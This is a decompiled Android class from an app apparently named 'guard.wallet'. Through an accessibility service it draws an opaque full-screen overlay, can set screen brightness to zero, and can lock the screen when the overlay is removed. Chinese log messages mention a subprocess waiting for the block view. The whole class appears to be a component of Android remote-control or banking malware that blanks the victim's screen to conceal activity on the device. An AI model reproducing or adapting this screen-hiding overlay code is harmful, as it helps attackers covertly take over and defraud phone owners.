package com.guard.wallet.helper;

import a1.AbstractC0026q;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import com.guard.wallet.utils.AbstractC0255k;
import e0.C0268f;
import e0.C0269g;
import e0.C0271i;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import p002e.RunnableC0261a;

/* renamed from: com.guard.wallet.helper.g */
/* loaded from: classes.dex */
public abstract class AbstractC0184g {

    /* renamed from: c */
    public static WindowManager f205c;

    /* renamed from: a */
    public static final AtomicReference f203a = new AtomicReference();

    /* renamed from: b */
    public static final ReentrantLock f204b = new ReentrantLock();

    /* renamed from: d */
    public static final AtomicInteger f206d = new AtomicInteger(-1);

    /* renamed from: e */
    public static final AtomicBoolean f207e = new AtomicBoolean(true);

    /* renamed from: f */
    public static final AtomicBoolean f208f = new AtomicBoolean(false);

    /* renamed from: a */
    public static boolean m347a(BlockViewVO blockViewVO) {
        if (blockViewVO == null) {
            try {
                blockViewVO = new BlockViewVO();
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.helper.g", e2);
            }
        }
        if (!m353g() && MyAccessibilityService.m554P() != null) {
            ReentrantLock reentrantLock = f204b;
            if (reentrantLock.tryLock()) {
                if (AbstractC0255k.m727a()) {
                    m348b(blockViewVO);
                } else {
                    new Handler(Looper.getMainLooper()).post(new RunnableC0261a(blockViewVO, 3));
                }
                AtomicInteger atomicInteger = new AtomicInteger(0);
                while (!f208f.get() && atomicInteger.incrementAndGet() < 100) {
                    Log.d("com.guard.wallet.helper.g", "副进程等待BlockView显示至窗口");
                    AbstractC0251g.T0(1);
                }
                reentrantLock.unlock();
            }
        }
        return m353g();
    }

    /* renamed from: b */
    public static void m348b(BlockViewVO blockViewVO) {
        try {
            f206d.set(AbstractC0251g.O0());
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.flags = 591800;
            layoutParams.format = 1;
            layoutParams.alpha = 1.0f;
            layoutParams.x = 0;
            layoutParams.y = 0;
            layoutParams.width = AbstractC0249e.m616e().getWidth().intValue();
            layoutParams.height = AbstractC0249e.m616e().getHeight().intValue();
            if (MyAccessibilityService.m554P() == null) {
                Log.d("com.guard.wallet.helper.g", "BlockTextView 创建失败");
                return;
            }
            C0269g c0269g = new C0269g(MyAccessibilityService.m554P(), blockViewVO.getHint(), blockViewVO.getBlockDrawable());
            if (f205c == null) {
                f205c = (WindowManager) MyAccessibilityService.m554P().getSystemService("window");
            }
            layoutParams.type = 2032;
            Log.d("com.guard.wallet.helper.g", "BlockTextView 创建完成");
            if (blockViewVO.isZeroBrightness() && AbstractC0255k.m729c(0)) {
                Log.d("com.guard.wallet.helper.g", "BlockTextView 亮度设置为0");
            }
            f207e.set(blockViewVO.isDestroyLock());
            f205c.addView(c0269g, layoutParams);
            c0269g.getViewTreeObserver().addOnWindowAttachListener(new ViewTreeObserverOnWindowAttachListenerC0182e());
            f203a.set(c0269g);
            AbstractC0252h.m688I();
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.g", e2);
        }
    }

    /* renamed from: c */
    public static void m349c() {
        try {
            if (f203a.get() != null) {
                ReentrantLock reentrantLock = f204b;
                if (reentrantLock.tryLock()) {
                    int i2 = 1;
                    if (AbstractC0255k.m727a()) {
                        m350d();
                    } else {
                        new Handler(Looper.getMainLooper()).post(new RunnableC0183f(i2));
                    }
                    AtomicInteger atomicInteger = new AtomicInteger(0);
                    while (f208f.get() && atomicInteger.incrementAndGet() < 100) {
                        Log.d("com.guard.wallet.helper.g", "等待BlockView从窗口移除");
                        AbstractC0251g.T0(1);
                    }
                    reentrantLock.unlock();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.g", e2);
        }
        m353g();
    }

    /* renamed from: d */
    public static void m350d() {
        try {
            AtomicInteger atomicInteger = f206d;
            if (atomicInteger.get() > 0) {
                if (AbstractC0255k.m729c(atomicInteger.get())) {
                    Log.d("com.guard.wallet.helper.g", "亮度已恢复");
                }
                atomicInteger.set(-1);
            }
            AtomicReference atomicReference = f203a;
            if (atomicReference.get() == null) {
                return;
            }
            MyAccessibilityService m554P = MyAccessibilityService.m554P();
            AtomicBoolean atomicBoolean = f207e;
            if (m554P != null && Build.VERSION.SDK_INT >= 28 && atomicBoolean.get()) {
                AbstractC0251g.F0(8);
                AbstractC0251g.T0(5);
            }
            if (f205c == null || atomicReference.get() == null) {
                return;
            }
            f205c.removeViewImmediate((View) atomicReference.get());
            atomicReference.set(null);
            atomicBoolean.set(true);
            AbstractC0252h.m688I();
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.g", e2);
        }
    }

    /* renamed from: e */
    public static boolean m351e() {
        try {
            if (f203a.get() != null) {
                ReentrantLock reentrantLock = f204b;
                if (reentrantLock.tryLock()) {
                    int i2 = 0;
                    if (AbstractC0255k.m727a()) {
                        m352f();
                    } else {
                        new Handler(Looper.getMainLooper()).post(new RunnableC0183f(i2));
                    }
                    AtomicInteger atomicInteger = new AtomicInteger(0);
                    while (f208f.get() && atomicInteger.incrementAndGet() < 100) {
                        Log.d("com.guard.wallet.helper.g", "等待BlockView从窗口移除");
                        AbstractC0251g.T0(1);
                    }
                    reentrantLock.unlock();
                }
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.g", e2);
        }
        return !m353g();
    }

    /* renamed from: f */
    public static void m352f() {
        try {
            AtomicInteger atomicInteger = f206d;
            if (atomicInteger.get() > 0) {
                if (AbstractC0255k.m729c(atomicInteger.get())) {
                    Log.d("com.guard.wallet.helper.g", "亮度已恢复");
                }
                atomicInteger.set(-1);
            }
            AtomicReference atomicReference = f203a;
            if (atomicReference.get() == null || f205c == null || atomicReference.get() == null) {
                return;
            }
            f205c.removeViewImmediate((View) atomicReference.get());
            atomicReference.set(null);
            f207e.set(true);
            AbstractC0252h.m688I();
        } catch (Exception e2) {
            AbstractC0026q.m186s("com.guard.wallet.helper.g", e2);
        }
    }

    /* renamed from: g */
    public static boolean m353g() {
        return (f203a.get() == null || f205c == null) ? false : true;
    }

    /* renamed from: h */
    public static void m354h(int i2) {
        AtomicReference atomicReference = f203a;
        if (atomicReference.get() != null) {
            C0269g c0269g = (C0269g) atomicReference.get();
            if (i2 <= 0) {
                c0269g.getClass();
                return;
            }
            WeakReference weakReference = c0269g.f451a;
            if (weakReference == null || weakReference.get() == null) {
                return;
            }
            C0271i c0271i = (C0271i) c0269g.f451a.get();
            if (i2 <= 0) {
                c0271i.getClass();
                return;
            }
            WeakReference weakReference2 = c0271i.f453a;
            if (weakReference2 == null || weakReference2.get() == null) {
                return;
            }
            C0268f c0268f = (C0268f) c0271i.f453a.get();
            c0268f.getClass();
            if (i2 > 0) {
                Message message = new Message();
                message.what = i2;
                c0268f.f443a.sendMessage(message);
            }
        }
    }
}
